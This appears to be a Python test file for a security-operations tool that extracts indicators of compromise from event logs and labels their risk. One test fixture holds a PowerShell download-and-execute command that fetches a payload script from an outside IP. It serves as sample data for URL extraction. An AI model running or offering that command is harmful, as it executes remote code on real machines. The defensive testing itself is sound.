from soc_insight.ingestion import load_bytes
from soc_insight.ioc import extract_iocs, apply_detection_risk
from soc_insight.detection.engine import run_detection


def test_extract_ip_and_hostname_and_username():
    raw = b'[{"timestamp": "2026-01-01T00:00:00Z", "event_type": "network_outbound_connection", "host": "WKS-1", "user": "jdupont", "destination_ip": "185.220.101.47"}]'
    events, _ = load_bytes(raw, "t.json")
    iocs = extract_iocs(events)
    types_values = {(i.ioc_type, i.value) for i in iocs}
    assert ("ipv4", "185.220.101.47") in types_values
    assert ("hostname", "WKS-1") in types_values
    assert ("username", "jdupont") in types_values


def test_extract_url_from_command():
    raw = b'[{"timestamp": "2026-01-01T00:00:00Z", "event_type": "process_powershell_execution", "host": "H", "command": "powershell -c IEX (New-Object Net.WebClient).DownloadString(\\"http://185.220.101.47/payload.ps1\\")"}]'
    events, _ = load_bytes(raw, "t.json")
    iocs = extract_iocs(events)
    urls = [i.value for i in iocs if i.ioc_type == "url"]
    assert any("185.220.101.47" in u for u in urls)


def test_ioc_defaults_to_observed_risk():
    raw = b'[{"timestamp": "2026-01-01T00:00:00Z", "event_type": "network_outbound_connection", "host": "WKS-1", "destination_ip": "185.220.101.47"}]'
    events, _ = load_bytes(raw, "t.json")
    iocs = extract_iocs(events)
    assert all(i.risk == "OBSERVED" for i in iocs)


def test_ioc_upgraded_to_suspicious_when_tied_to_detection():
    raw = b"""[
      {"timestamp": "2026-01-01T00:00:00Z", "event_type": "auth_failed_login", "host": "WKS-1", "user": "u", "source_ip": "185.220.101.47"},
      {"timestamp": "2026-01-01T00:00:05Z", "event_type": "auth_failed_login", "host": "WKS-1", "user": "u", "source_ip": "185.220.101.47"},
      {"timestamp": "2026-01-01T00:00:10Z", "event_type": "auth_failed_login", "host": "WKS-1", "user": "u", "source_ip": "185.220.101.47"},
      {"timestamp": "2026-01-01T00:00:15Z", "event_type": "auth_failed_login", "host": "WKS-1", "user": "u", "source_ip": "185.220.101.47"},
      {"timestamp": "2026-01-01T00:00:20Z", "event_type": "auth_failed_login", "host": "WKS-1", "user": "u", "source_ip": "185.220.101.47"}
    ]"""
    events, _ = load_bytes(raw, "t.json")
    detections = run_detection(events)
    iocs = extract_iocs(events)
    apply_detection_risk(iocs, detections)
    target = next(i for i in iocs if i.value == "185.220.101.47")
    assert target.risk == "SUSPICIOUS"


def test_no_false_malicious_claim_language():
    """IOC risk labels must never assert confirmed maliciousness on their own."""
    from soc_insight.ioc.extractor import extract_iocs
    raw = b'[{"timestamp": "2026-01-01T00:00:00Z", "event_type": "x", "host": "H", "destination_ip": "185.220.101.47"}]'
    events, _ = load_bytes(raw, "t.json")
    iocs = extract_iocs(events)
    for i in iocs:
        assert i.risk in ("OBSERVED", "SUSPICIOUS", "ASSOCIATED_WITH_INCIDENT")
